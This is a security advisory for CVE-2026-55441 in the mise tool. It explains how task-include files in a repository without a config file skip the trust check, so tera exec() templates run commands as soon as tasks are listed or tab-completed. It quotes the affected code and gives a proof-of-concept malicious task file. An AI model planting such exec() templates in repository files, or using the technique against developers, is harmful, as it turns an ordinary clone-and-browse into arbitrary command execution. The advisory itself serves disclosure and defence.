# [H] Mise vulnerable to arbitrary command execution via task-include files in an untrusted, config-less repository

## Summary
Severity: High
Advisory: GHSA-77g9-363w-rccq
CVE: CVE-2026-55441
CWE: CWE-732, CWE-78, CWE-94
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-77g9-363w-rccq
Type: github-advisory

## Affected
- crates.io: `mise` — affected >=0 <2026.6.4

## Details
### Summary

mise's trust feature gates config files (`mise.toml`, `.tool-versions`) through `trust_check`, but task-include files are loaded on a path that never reaches it. When a directory has a task-include dir (`mise-tasks/`, `.mise/tasks/`, …) but no config file, mise falls back to the default includes and renders each task's tera fields — and that tera environment has `exec()` registered. A `{{ exec(command='…') }}` in any rendered field runs arbitrary commands the moment the tasks are merely listed. There's no config file to gate on, so no trust prompt ever appears. Read-only commands trigger it: `mise tasks`, `mise task ls`, `mise run`, `mise tasks --usage` (the query shell completion runs on Tab). The victim only has to `cd` into a cloned repo and list or tab-complete a task
## Details

Trust is enforced only inside config-file parsing:

- `src/config/config_file/mise_toml.rs:276` — `MiseToml::from_str` → `trust_check(path)?`
- `src/config/config_file/tool_versions.rs:62` — `.tool-versions` parser → `trust_check(&path)?`
- `src/config/env_directive/mod.rs:681` — env templates → `trust_check(path)?` (only when the value contains template syntax)

Task-include files are loaded by `load_tasks_in_dir` / `load_local_tasks_with_context`,
which walk every directory from CWD up to root. For each directory, `configs_at_root`
returns the parsed (trusted) configs rooted there; **if there is no config in the
directory**, mise falls back to the default task-include list resolved relative to that
directory and loads whatever it finds — with no trust check:

`src/config/mod.rs` (`load_tasks_in_dir`, ~2586):
```rust
let (includes, resolve_dir) = configs
    .iter()
    .find_map(|cf| match cf.task_config_includes() { … })
    .transpose()?
    .unwrap_or_else(|| (default_task_includes(), dir.to_path_buf())); // no config -> default includes
…
for include in &includes {
    let paths = … expand_task_include(&resolve_dir, include);
    for p in paths {
        let mut loaded = load_tasks_includes(config, &p, dir, &task_config_dir, templates).await?;
        …
    }
}
```

`default_task_includes()` (`src/config/mod.rs:1825`):
```rust
vec!["mise-tasks", ".mise-tasks", ".mise/tasks", ".config/mise/tasks", "mise/tasks"]
```

`load_task_file` (`src/config/mod.rs:2645`) reads the TOML directly with no trust check
and renders each task:
```rust
let raw = file::read_to_string_async(path).await?;
let mut tasks = toml::from_str::<Tasks>(&raw) … ;        // no trust_check
…
resolve_task_template(&mut task, templates)?;
if let Err(err) = task.render(config, &config_root).await { … }  // renders tera, incl. exec()
```

`Task::render` (`src/task/mod.rs:1475`) renders many fields through tera, and the tera
instance is built with `get_tera(Some(config_root))`:
```rust
let mut tera = get_tera(Some(config_root));
…
if contains_template_syntax(&self.description) {
    self.description = render_str(&mut tera, &self.description, &tera_ctx)?;
}
```

`get_tera` (`src/tera.rs:407`) registers the command-executing functions:
```rust
pub fn get_tera(dir: Option<&Path>) -> Tera {
    let mut tera = TERA.clone();
    let dir = dir.map(PathBuf::from);
    tera.register_function("exec", tera_exec(dir.clone(), env::PRISTINE_ENV.clone()));
    tera.register_function("read_file", tera_read_file(dir));
    tera
}
```

So a tera `{{ exec(command='…') }}` placed in any rendered task field
(`description`, `dir`, `shell`, `sources`, `aliases`, `depends`, `tools`, …) of a TOML
task file — or in a `#MISE description="…"` header of an executable script task
(`Task::from_path`) — executes when the task is merely *loaded for listing*, with no
trust prompt. `exec()` is not gated by `experimental` (default `experimental = false`).

## Proof of concept

Tested against the prebuilt release binary, `mise 2026.6.4 linux-x64`, with a
pristine `HOME` so nothing is pre-trusted.

Repo layout :
```
malicious-repo/
└── mise-tasks/
    └── ci.toml
```

`mise-tasks/ci.toml`:
```toml
[test]
description = "{{ exec(command='id > /tmp/mise_clone_proof.txt; hostname >> /tmp/mise_clone_proof.txt') }}"
run = "cargo test"
```

Trigger (any of these; a victim who has `mise activate` set up hits the last one by just
pressing Tab to complete a task name):
```bash
export HOME="$(mktemp -d)"          # nothing pre-trusted
export MISE_TRUSTED_CONFIG_PATHS=""
cd malicious-repo
mise tasks            # or: mise task ls / mise run / mise tasks --usage
```

output:
```
test
```
and the side effect :
```
miau@linux:~$ cat /tmp/mise_clone_proof.txt
uid=1000(miau) gid=1000(miau) groups=1000(miau)…
linux 
```

## References
- https://github.com/jdx/mise/security/advisories/GHSA-77g9-363w-rccq
- https://github.com/jdx/mise
